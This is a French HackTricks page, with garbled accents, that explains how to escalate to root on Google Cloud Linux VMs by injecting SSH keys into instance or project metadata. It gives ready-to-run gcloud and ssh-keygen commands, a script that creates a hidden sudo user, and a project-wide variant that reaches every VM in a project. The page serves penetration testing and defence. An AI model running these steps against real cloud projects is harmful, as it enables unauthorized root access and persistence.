# GCP - Ajouter des m√©tadonn√©es SSH personnalis√©es

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Modification des m√©tadonn√©es <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Un attaquant avec les permissions pour **modifier les m√©tadonn√©es de l'instance** pourrait compromettre/escalader vers un compte de service avec cette permission (qui pourrait √™tre restreint par un scope) :

### **Ajouter des cl√©s SSH aux m√©tadonn√©es personnalis√©es**

Les **syst√®mes Linux** sur GCP ex√©cutent g√©n√©ralement des scripts [Python Linux Guest Environment pour Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). L'un d'eux est le [daemon des comptes](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), qui **interroge p√©riodiquement** le point de terminaison des m√©tadonn√©es de l'instance pour **d√©tecter les changements dans les cl√©s publiques SSH autoris√©es**.

**Si une nouvelle cl√© publique** est d√©tect√©e, elle sera trait√©e et **ajout√©e √† la machine locale**. Selon le format de la cl√©, elle sera soit ajout√©e au fichier `~/.ssh/authorized_keys` d'un **utilisateur existant, soit cr√©era un nouvel utilisateur avec des droits `sudo`**.

Ainsi, si vous pouvez **modifier les m√©tadonn√©es personnalis√©es de l'instance** avec votre compte de service, vous pouvez **escalader** vers root sur le syst√®me local en **obtenant des droits SSH** sur un compte privil√©gi√©. Si vous pouvez modifier **les m√©tadonn√©es personnalis√©es du projet**, vous pouvez **escalader** vers root sur **tout syst√®me dans le projet GCP actuel** qui ex√©cute le daemon des comptes.

### **Ajouter une cl√© SSH √† un utilisateur privil√©gi√© existant**

Commen√ßons par ajouter notre propre cl√© √† un compte existant, car cela fera probablement le moins de bruit.

**V√©rifiez l'instance pour les cl√©s SSH existantes**. Choisissez l'un de ces utilisateurs car ils sont susceptibles d'avoir des droits sudo.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
Recherchez une section comme suit :
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
Remarquez le **format l√©g√®rement inhabituel** des cl√©s publiques - le **nom d'utilisateur** est indiqu√© au **d√©but** (suivi d'un deux-points) puis √† nouveau √† la **fin**. Nous devrons respecter ce format. Contrairement √† une op√©ration SSH classique, le nom d'utilisateur est absolument important !

**Enregistrez les lignes avec les noms d'utilisateur et les cl√©s dans un nouveau fichier texte** appel√© `meta.txt`.

Supposons que nous ciblons l'utilisateur `alice` mentionn√© ci-dessus. Nous allons **g√©n√©rer une nouvelle cl√©** pour nous-m√™mes de cette mani√®re :
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
Ajoutez votre nouvelle cl√© publique au fichier `meta.txt` en imitant le format :
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
Maintenant, vous pouvez **r√©√©crire les m√©tadonn√©es de cl√© SSH** pour votre instance avec la commande suivante :
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
Vous pouvez maintenant **acc√©der √† un shell dans le contexte de `alice`** comme suit :
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **Cr√©er un nouvel utilisateur privil√©gi√© et ajouter une cl√© SSH**

Aucune cl√© existante trouv√©e en suivant les √©tapes ci-dessus ? Personne d'autre d'int√©ressant dans `/etc/passwd` √† cibler ?

Vous pouvez **suivre le m√™me processus** que ci-dessus, mais **inventez simplement un nouveau nom d'utilisateur**. Cet utilisateur sera cr√©√© automatiquement et se verra accorder les droits de `sudo`. Script√©, le processus ressemblerait √† ceci :
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Cl√©s SSH au niveau du projet <a href="#sshing-around" id="sshing-around"></a>

En suivant les d√©tails mentionn√©s dans la section pr√©c√©dente, vous pouvez essayer de compromettre plus de VMs.

Nous pouvons d√©velopper cela en [**appliquant des cl√©s SSH au niveau du projet**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide), ce qui vous donne la permission de **vous connecter en SSH √† un compte privil√©gi√©** pour toute instance qui n'a pas explicitement choisi l'option "Bloquer les cl√©s SSH √† l'√©chelle du projet".
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
Si vous √™tes vraiment audacieux, vous pouvez √©galement taper `gcloud compute ssh [INSTANCE]` pour utiliser votre nom d'utilisateur actuel sur d'autres machines.

# R√©f√©rences
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
